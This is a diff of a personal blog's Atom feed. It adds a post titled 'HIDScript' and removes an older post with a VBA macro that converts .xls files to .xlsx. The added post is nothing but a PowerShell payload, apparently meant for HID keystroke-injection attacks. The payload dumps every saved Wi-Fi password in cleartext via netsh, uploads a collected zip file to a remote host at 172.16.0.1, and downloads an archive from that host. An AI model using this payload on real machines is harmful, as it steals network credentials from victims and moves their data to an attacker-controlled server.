@@ -4,7 +4,7 @@
   <title><![CDATA[icps]]></title>
   <link href="https://icps0610.github.io/atom.xml" rel="self"/>
   <link href="https://icps0610.github.io/"/>
-  <updated>2021-03-25T21:24:35+08:00</updated>
+  <updated>2021-04-01T16:45:35+08:00</updated>
   <id>https://icps0610.github.io/</id>
   <author>
     <name><![CDATA[icps]]></name>
@@ -12,6 +12,58 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[HIDScript]]></title>
+    <link href="https://icps0610.github.io/blog/2021/04/01/hidscript/"/>
+    <updated>2021-04-01T16:41:26+08:00</updated>
+    <id>https://icps0610.github.io/blog/2021/04/01/hidscript</id>
+    <content type="html"><![CDATA[<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='powershell'><span class='line'><span class="c">## uploadFiles</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$FilePath</span><span class="p">=</span><span class="s2">&quot;C:/Windows/Temp/files.zip&quot;</span>
+</span><span class='line'><span class="nv">$Url</span><span class="p">=</span><span class="s2">&quot;http://172.16.0.1/&quot;</span>
+</span><span class='line'><span class="nv">$fileName</span><span class="p">=</span><span class="no">[System.IO.Path]</span><span class="p">::</span><span class="n">GetFileName</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">)</span>
+</span><span class='line'><span class="nv">$fileBytes</span><span class="p">=(</span><span class="no">[System.IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$FilePath</span><span class="p">))</span>
+</span><span class='line'><span class="nv">$fileEnc</span><span class="p">=</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">GetEncoding</span><span class="p">(</span><span class="s2">&quot;iso-8859-1&quot;</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$fileBytes</span><span class="p">)</span>
+</span><span class='line'><span class="nv">$boundary</span><span class="p">=</span><span class="no">[System.Guid]</span><span class="p">::</span><span class="n">NewGuid</span><span class="p">().</span><span class="n">ToString</span><span class="p">()</span>
+</span><span class='line'><span class="nv">$lf</span><span class="p">=</span><span class="s2">&quot;</span><span class="se">`r`n</span><span class="s2">&quot;</span>
+</span><span class='line'><span class="nv">$bodyLines</span><span class="p">=(</span><span class="s2">&quot;--$boundary&quot;</span><span class="p">,</span><span class="s2">&quot;Content-Disposition: form-data; name=</span><span class="se">`&quot;</span><span class="s2">uploads</span><span class="se">`&quot;</span><span class="s2">; filename=</span><span class="se">`&quot;</span><span class="s2">$FileName</span><span class="se">`&quot;</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;Content-Type: application/octet-stream$lf&quot;</span><span class="p">,</span><span class="nv">$fileEnc</span><span class="p">,</span><span class="s2">&quot;--$boundary--$lf&quot;</span><span class="p">)</span> <span class="n">-join</span> <span class="nv">$lf</span>
+</span><span class='line'><span class="nb">Invoke-RestMethod</span> <span class="n">-Uri</span> <span class="nv">$Url</span> <span class="n">-Method</span> <span class="n">Post</span> <span class="n">-ContentType</span> <span class="s2">&quot;multipart/form-data; boundary=</span><span class="se">`&quot;</span><span class="s2">$boundary</span><span class="se">`&quot;</span><span class="s2">&quot;</span> <span class="n">-Body</span> <span class="nv">$bodyLines</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="c">## getWiFiPassWd</span>
+</span><span class='line'><span class="nv">$ws</span><span class="p">=(</span><span class="n">netsh</span> <span class="n">wlan</span> <span class="n">show</span> <span class="n">profiles</span><span class="p">)</span> <span class="o">-match</span> <span class="s2">&quot; : &quot;</span><span class="p">;</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$s</span> <span class="k">in</span> <span class="nv">$ws</span><span class="p">){</span><span class="n">echo</span> <span class="nv">$s</span><span class="p">;</span><span class="nv">$ssid</span><span class="p">=</span><span class="nv">$s</span><span class="p">.</span><span class="n">Split</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)[</span><span class="n">1</span><span class="p">].</span><span class="n">Trim</span><span class="p">();</span><span class="nv">$pw</span><span class="p">=(</span><span class="n">netsh</span> <span class="n">wlan</span> <span class="n">show</span> <span class="n">profiles</span> <span class="n">name</span><span class="p">=</span><span class="nv">$ssid</span> <span class="n">key</span><span class="p">=</span><span class="n">clear</span><span class="p">);</span><span class="nv">$c</span><span class="p">=</span><span class="n">0</span><span class="p">;</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$p</span> <span class="k">in</span> <span class="nv">$pw</span><span class="p">){;</span><span class="k">if</span><span class="p">(</span><span class="nv">$c</span> <span class="o">-eq</span> <span class="s2">&quot;32&quot;</span><span class="p">){</span><span class="nv">$pass</span><span class="p">=</span><span class="nv">$p</span><span class="p">.</span><span class="n">Split</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)[</span><span class="n">1</span><span class="p">].</span><span class="n">Trim</span><span class="p">();}</span><span class="nv">$c</span><span class="p">+=</span><span class="n">1</span><span class="p">}</span><span class="n">echo</span> <span class="s2">&quot;$ssid $pass&quot;</span> <span class="p">&gt;&gt;</span> <span class="nv">$FilePath</span><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">## downloadFiles</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$Source</span><span class="p">=</span><span class="s2">&quot;http://172.16.0.1/uploads/dFiles.7z&quot;</span>
+</span><span class='line'><span class="nv">$Destination</span><span class="p">=</span><span class="s2">&quot;C:/Windows/Temp/dFiles.7z&quot;</span>
+</span><span class='line'><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="nv">$Source</span> <span class="n">-OutFile</span> <span class="nv">$Destination</span>
+</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Cmd_beep_sound]]></title>
@@ -575,78 +627,6 @@
 <p><code>/etc/NetworkManager/system-connections/[VPN]</code><br/>
 <code>nmcli con up id [VPN]</code><br/>
 <code>nmcli con down id [VPN]</code></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Xls_to_xlsx]]></title>
-    <link href="https://icps0610.github.io/blog/2020/01/17/xls-to-xlsx/"/>
-    <updated>2020-01-17T20:58:21+08:00</updated>
-    <id>https://icps0610.github.io/blog/2020/01/17/xls-to-xlsx</id>
-    <content type="html"><![CDATA[<h6>vba</h6>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">Dim</span> <span class="n">iFile</span><span class="p">(</span><span class="mi">1</span> <span class="no">To</span> <span class="mi">100000</span><span class="p">)</span> <span class="no">As</span> <span class="nb">String</span>
-</span><span class='line'><span class="no">Dim</span> <span class="n">count</span> <span class="no">As</span> <span class="nb">Integer</span>
-</span><span class='line'><span class="no">Sub</span> <span class="n">xls2xlsx</span><span class="p">()</span>
-</span><span class='line'> <span class="n">iPath</span> <span class="o">=</span> <span class="no">ThisWorkbook</span><span class="o">.</span><span class="n">Path</span>
-</span><span class='line'> <span class="no">On</span> <span class="no">Error</span> <span class="no">Resume</span> <span class="no">Next</span>
-</span><span class='line'> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
-</span><span class='line'> <span class="n">zdir</span> <span class="n">iPath</span>
-</span><span class='line'> <span class="no">For</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span> <span class="no">To</span> <span class="n">count</span>
-</span><span class='line'> <span class="no">If</span> <span class="n">iFile</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="no">Like</span> <span class="s2">&quot;*.xls&quot;</span> <span class="no">And</span> <span class="n">iFile</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">&lt;&gt;</span> <span class="no">ThisWorkbook</span><span class="o">.</span><span class="n">FullName</span> <span class="no">Then</span>
-</span><span class='line'> <span class="no">MyFile</span> <span class="o">=</span> <span class="n">iFile</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-</span><span class='line'> <span class="no">FilePath</span> <span class="o">=</span> <span class="no">Replace</span><span class="p">(</span><span class="no">MyFile</span><span class="p">,</span> <span class="s2">&quot;.xls&quot;</span><span class="p">,</span> <span class="s2">&quot;.xlsx&quot;</span><span class="p">)</span>
-</span><span class='line'> <span class="no">If</span> <span class="no">Dir</span><span class="p">(</span><span class="no">FilePath</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="no">Empty</span> <span class="no">Then</span>
-</span><span class='line'> <span class="no">Set</span> <span class="no">WBookOther</span> <span class="o">=</span> <span class="no">Workbooks</span><span class="o">.</span><span class="n">Open</span><span class="p">(</span><span class="no">MyFile</span><span class="p">)</span>
-</span><span class='line'> <span class="no">Application</span><span class="o">.</span><span class="n">ScreenUpdating</span> <span class="o">=</span> <span class="no">False</span>
-</span><span class='line'> <span class="no">ActiveWorkbook</span><span class="o">.</span><span class="n">SaveAs</span> <span class="ss">Filename</span><span class="p">:</span><span class="o">=</span><span class="no">FilePath</span><span class="p">,</span> <span class="ss">FileFormat</span><span class="p">:</span><span class="o">=</span><span class="n">xlOpenXMLWorkbook</span><span class="p">,</span> <span class="ss">CreateBackup</span><span class="p">:</span><span class="o">=</span><span class="no">False</span>
-</span><span class='line'> <span class="no">WBookOther</span><span class="o">.</span><span class="n">Close</span> <span class="ss">SaveChanges</span><span class="p">:</span><span class="o">=</span><span class="no">False</span>
-</span><span class='line'> <span class="no">Application</span><span class="o">.</span><span class="n">ScreenUpdating</span> <span class="o">=</span> <span class="no">True</span>
-</span><span class='line'> <span class="no">End</span> <span class="no">If</span>
-</span><span class='line'> <span class="no">End</span> <span class="no">If</span>
-</span><span class='line'> <span class="no">Next</span>
-</span><span class='line'><span class="no">End</span> <span class="no">Sub</span>
-</span><span class='line'><span class="no">Sub</span> <span class="n">zdir</span><span class="p">(</span><span class="nb">p</span><span class="p">)</span>
-</span><span class='line'> <span class="no">Set</span> <span class="n">fs</span> <span class="o">=</span> <span class="no">CreateObject</span><span class="p">(</span><span class="s2">&quot;scripting.filesystemobject&quot;</span><span class="p">)</span>
-</span><span class='line'> <span class="no">For</span> <span class="no">Each</span> <span class="n">f</span> <span class="no">In</span> <span class="n">fs</span><span class="o">.</span><span class="n">GetFolder</span><span class="p">(</span><span class="nb">p</span><span class="p">)</span><span class="o">.</span><span class="n">Files</span>
-</span><span class='line'> <span class="no">If</span> <span class="n">f</span> <span class="o">&lt;&gt;</span> <span class="no">ThisWorkbook</span><span class="o">.</span><span class="n">FullName</span> <span class="no">Then</span> <span class="n">count</span> <span class="o">=</span> <span class="n">count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span> <span class="n">iFile</span><span class="p">(</span><span class="n">count</span><span class="p">)</span> <span class="o">=</span> <span class="n">f</span>
-</span><span class='line'> <span class="no">Next</span>
-</span><span class='line'> <span class="no">For</span> <span class="no">Each</span> <span class="n">m</span> <span class="no">In</span> <span class="n">fs</span><span class="o">.</span><span class="n">GetFolder</span><span class="p">(</span><span class="nb">p</span><span class="p">)</span><span class="o">.</span><span class="n">SubFolders</span>
-</span><span class='line'> <span class="n">zdir</span> <span class="n">m</span>
-</span><span class='line'> <span class="no">Next</span>
-</span><span class='line'><span class="no">End</span> <span class="no">Sub</span>
-</span></code></pre></td></tr></table></div></figure>
-
 ]]></content>
   </entry>
   
